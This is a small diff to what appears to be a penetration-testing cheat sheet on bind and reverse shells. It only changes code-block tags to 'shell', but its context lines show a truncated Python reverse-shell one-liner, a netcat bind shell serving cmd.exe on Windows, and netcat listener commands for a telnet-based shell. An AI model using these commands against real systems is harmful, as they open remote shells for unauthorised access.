@@ -201,7 +201,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ​	on Windows
 
-```markdown
+```shell
 #bindShell
 	nc -nvlp 4444 -e cmd.exe
 #reverseShell
@@ -235,7 +235,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 #### telnet
 
-```
+```shell
 # On linux this approach seems to nc without -e
 nc -lvp 4444    # Attacker. Input (Commands)
 nc -lvp 4445    # Attacker. Ouput (Results)
